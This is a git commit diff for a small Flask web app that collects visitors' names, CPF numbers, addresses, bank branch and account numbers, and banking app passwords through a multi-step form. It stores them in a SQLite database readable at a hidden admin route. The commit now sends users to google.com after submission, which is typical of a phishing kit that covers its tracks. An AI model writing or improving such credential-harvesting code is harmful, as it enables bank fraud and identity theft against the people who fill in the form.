21ccca0b20f9c558a1d264b1fea2fc091e24fb1b
Danilogca55 <ddigiorgigomes37@icloud.com>
2026-03-08 21:33:49 -0300

    Update app.py

--- app.py
+++ app.py
@@ -4,15 +4,15 @@ import os
 
 app = Flask(__name__)
 
-# Configuração do Banco de Dados com os novos campos
+# Configuração do Banco de Dados
 def init_db():
     conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS usuarios (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            nome TEXT, data_nasc TEXT, cpf TEXT,
-            cep TEXT, rua TEXT, numero TEXT,
+            nome TEXT, cpf TEXT,
+            cep TEXT, rua TEXT,
             agencia TEXT, conta TEXT, senha_app TEXT
         )
     ''')
@@ -23,34 +23,28 @@ def init_db():
 def index():
     return render_template('cadastro.html')
 
-# Rota para salvar os dados do formulário de 3 passos
 @app.route('/login', methods=['POST'])
 def login():
-    # Coletando todos os campos do formulário
+    # Coleta de dados dos 3 passos
     dados = (
-        request.form.get('nome'), request.form.get('data_nasc'), request.form.get('cpf'),
-        request.form.get('cep'), request.form.get('rua'), request.form.get('numero'),
+        request.form.get('nome'), request.form.get('cpf'),
+        request.form.get('cep'), request.form.get('rua'),
         request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
     )
     
     conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
     cursor.execute('''
-        INSERT INTO usuarios (nome, data_nasc, cpf, cep, rua, numero, agencia, conta, senha_app)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        INSERT INTO usuarios (nome, cpf, cep, rua, agencia, conta, senha_app)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
     ''', dados)
     conn.commit()
     conn.close()
     
-    # Após salvar, envia para o Dashboard do usuário
-    return redirect(url_for('dashboard'))
+    return redirect('https://www.google.com')
 
-@app.route('/dashboard')
-def dashboard():
-    return render_template('index.html')
-
-# --- PAINEL DO ADMINISTRADOR ---
-@app.route('/admin_painel_secreto_99') # Link difícil para ninguém achar
+# PAINEL DO ADMIN
+@app.route('/admin_painel_secreto_99')
 def admin():
     conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
@@ -63,6 +57,7 @@ if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
 
 
 
